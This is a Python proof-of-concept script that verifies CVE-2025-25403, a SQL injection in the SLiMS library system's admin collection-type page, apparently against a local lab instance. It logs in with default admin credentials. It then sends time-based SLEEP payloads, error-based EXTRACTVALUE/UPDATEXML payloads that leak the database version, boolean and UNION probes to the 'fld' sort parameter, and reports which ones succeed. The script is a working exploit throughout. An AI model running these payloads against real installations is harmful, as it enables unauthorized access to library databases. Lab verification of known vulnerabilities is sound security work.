#!/usr/bin/env python3
import requests
import re
import time
import sys

TARGET_URL = "http://localhost:8095/slims"

def get_session():
    session = requests.Session()
    resp = session.get(f'{TARGET_URL}/index.php?p=login')
    csrf_match = re.search(r'name="_csrf_token_([a-f0-9]+)" value="([a-f0-9]+)"', resp.text)
    
    login_data = {'userName': 'admin', 'passWord': 'admin', 'logMeIn': 'Login'}
    if csrf_match:
        login_data[f'_csrf_token_{csrf_match.group(1)}'] = csrf_match.group(2)
    
    session.post(f'{TARGET_URL}/index.php?p=login', data=login_data)
    return session

def test_baseline(session):
    """Get baseline response"""
    resp = session.get(f'{TARGET_URL}/admin/modules/master_file/coll_type.php', params={'fld': 'coll_type_name', 'dir': 'ASC'})
    return resp.status_code, len(resp.text), resp.text

def test_time_based(session, delay=5):
    """Test time-based SQL injection with multiple payloads"""
    vuln_url = f'{TARGET_URL}/admin/modules/master_file/coll_type.php'
    
    payloads = [
        f"coll_type_name' AND SLEEP({delay})-- -",
        f"coll_type_name' AND (SELECT SLEEP({delay}))-- -",
        f"coll_type_name',(SELECT SLEEP({delay}))-- -",
        f"1' AND SLEEP({delay})-- -",
        f"' OR SLEEP({delay})-- -",
        f"0 AND (SELECT 1 FROM (SELECT SLEEP({delay}))x)-- -",
    ]
    
    results = []
    for payload in payloads:
        start = time.time()
        try:
            resp = session.get(vuln_url, params={'fld': payload, 'dir': '1'}, timeout=delay+5)
            elapsed = time.time() - start
        except requests.Timeout:
            elapsed = delay + 5
        
        success = elapsed >= delay
        results.append((payload[:50], elapsed, success))
        print(f"  Payload: {payload[:40]}... | Time: {elapsed:.2f}s | {'VULN' if success else 'SAFE'}")
    
    return any(r[2] for r in results)

def test_error_based(session):
    """Test error-based SQL injection"""
    vuln_url = f'{TARGET_URL}/admin/modules/master_file/coll_type.php'
    
    payloads = [
        ("' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))-- -", "error"),
        ("' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)-- -", "error"),
        ("' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)-- -", "error"),
    ]
    
    for payload, _ in payloads:
        resp = session.get(vuln_url, params={'fld': payload, 'dir': '1'})
        if 'XPATH syntax error' in resp.text or 'Duplicate entry' in resp.text:
            print(f"  ERROR-BASED SQLI CONFIRMED with: {payload[:50]}...")
            return True, resp.text
        if 'SQL syntax' in resp.text or 'mysql' in resp.text.lower():
            print(f"  SQL Error found: {payload[:50]}...")
    
    return False, ""

def test_union_based(session):
    """Test UNION-based SQL injection"""
    vuln_url = f'{TARGET_URL}/admin/modules/master_file/coll_type.php'
    
    for cols in range(1, 15):
        nulls = ','.join(['NULL'] * cols)
        payload = f"' UNION SELECT {nulls}-- -"
        resp = session.get(vuln_url, params={'fld': payload, 'dir': '1'})
        if 'used select statements have a different number' not in resp.text.lower():
            if resp.status_code == 200:
                print(f"  Potential UNION with {cols} columns")
    
    return False

def test_blind_comparison(session):
    """More strict boolean-based test"""
    vuln_url = f'{TARGET_URL}/admin/modules/master_file/coll_type.php'
    
    # Multiple requests to establish baseline variance
    baselines = []
    for _ in range(3):
        resp = session.get(vuln_url, params={'fld': 'coll_type_name', 'dir': 'ASC'})
        baselines.append(len(resp.text))
    
    baseline_variance = max(baselines) - min(baselines)
    print(f"  Baseline variance: {baseline_variance} bytes")
    
    # Test with conditional payloads
    true_payload = "' OR '1'='1"
    false_payload = "' OR '1'='2"
    
    true_resp = session.get(vuln_url, params={'fld': true_payload, 'dir': '1'})
    false_resp = session.get(vuln_url, params={'fld': false_payload, 'dir': '1'})
    
    diff = abs(len(true_resp.text) - len(false_resp.text))
    print(f"  True payload response: {len(true_resp.text)} bytes")
    print(f"  False payload response: {len(false_resp.text)} bytes")
    print(f"  Difference: {diff} bytes")
    
    # Check for SQL error messages
    has_sql_error = any(x in true_resp.text.lower() for x in ['sql', 'mysql', 'syntax', 'query'])
    
    if diff > baseline_variance + 100:
        return True, diff
    return False, diff

def check_sql_error(session):
    """Check if SQL errors are exposed"""
    vuln_url = f'{TARGET_URL}/admin/modules/master_file/coll_type.php'
    
    # Malformed SQL to trigger error
    payload = "'"
    resp = session.get(vuln_url, params={'fld': payload, 'dir': '1'})
    
    error_indicators = ['sql', 'mysql', 'syntax', 'query', 'error', 'warning', 'mysqli']
    for indicator in error_indicators:
        if indicator in resp.text.lower():
            print(f"  Found SQL-related string: '{indicator}'")
            return True, resp.text
    
    return False, resp.text

def main():
    print("=" * 70)
    print("CVE-2025-25403 Strict SQL Injection Verification")
    print("=" * 70)
    print()
    
    print("[*] Getting authenticated session...")
    session = get_session()
    cookies = session.cookies.get_dict()
    if 'admin_logged_in' not in cookies:
        print("[-] Login failed!")
        return False
    print(f"[+] Login successful! Session: {cookies.get('SenayanAdmin', 'N/A')[:20]}...")
    print()
    
    print("[*] Testing baseline response...")
    status, length, content = test_baseline(session)
    print(f"    Status: {status}, Length: {length}")
    print()
    
    print("[*] Checking for SQL error exposure...")
    has_error, error_resp = check_sql_error(session)
    if has_error:
        print("[!] SQL errors are exposed - may be exploitable")
    print()
    
    print("[*] Testing TIME-BASED SQL Injection (3 second delay)...")
    time_vuln = test_time_based(session, delay=3)
    print()
    
    print("[*] Testing BOOLEAN-BASED SQL Injection...")
    bool_vuln, diff = test_blind_comparison(session)
    print()
    
    print("[*] Testing ERROR-BASED SQL Injection...")
    error_vuln, _ = test_error_based(session)
    print()
    
    print("=" * 70)
    print("RESULTS:")
    print("=" * 70)
    print(f"  Time-based SQLi:    {'VULNERABLE' if time_vuln else 'NOT CONFIRMED'}")
    print(f"  Boolean-based SQLi: {'VULNERABLE' if bool_vuln else 'NOT CONFIRMED'}")
    print(f"  Error-based SQLi:   {'VULNERABLE' if error_vuln else 'NOT CONFIRMED'}")
    print()
    
    if time_vuln or error_vuln:
        print("[+] SQL INJECTION VULNERABILITY CONFIRMED!")
        return True
    elif bool_vuln:
        print("[?] Possible SQL injection (boolean-based only, needs manual verification)")
        return True
    else:
        print("[-] Could not confirm SQL injection vulnerability")
        return False

if __name__ == "__main__":
    success = main()
    sys.exit(0 if success else 1)
